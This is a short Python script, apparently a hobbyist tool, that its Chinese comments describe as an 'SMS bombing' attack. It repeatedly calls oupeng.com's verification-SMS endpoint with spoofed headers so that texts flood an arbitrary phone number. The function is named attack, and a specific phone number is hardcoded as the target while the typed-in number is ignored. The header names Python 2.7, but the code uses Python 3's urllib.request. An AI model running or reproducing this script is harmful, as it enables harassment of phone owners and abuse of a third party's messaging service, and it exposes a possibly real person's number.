# -*- coding: utf-8 -*-
# -------------------------------------
#   python2.7
#   author:loster
#   version:0.1
#   description:向http://www.oupeng.com网站get数据，给任意手机号码发送验证短信，进行短信轰炸
#                但是每天对同一手机号有条数限制
# ---------------------------------
import urllib.request


def attack(phone):
    datas = ""
    url = 'http://www.oupeng.com/sms/sendsms.php?os=s60&mobile=%s' % phone
    i_headers = {"User-Agent": "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9.1) Gecko/20090624 Firefox/3.5",
                 "Accept": "text/plain", 'Referer': 'http://www.oupeng.com/download'}
    # payload=urllib.urlencode(payload)

    request = urllib.request.Request(url=url, headers=i_headers)
    response = urllib.request.urlopen(request)
    datas = response.read()
    print(datas)
    print('attack success!!!')


if __name__ == "__main__":
    phone = input('input the phone:')
    attack('18101519736')
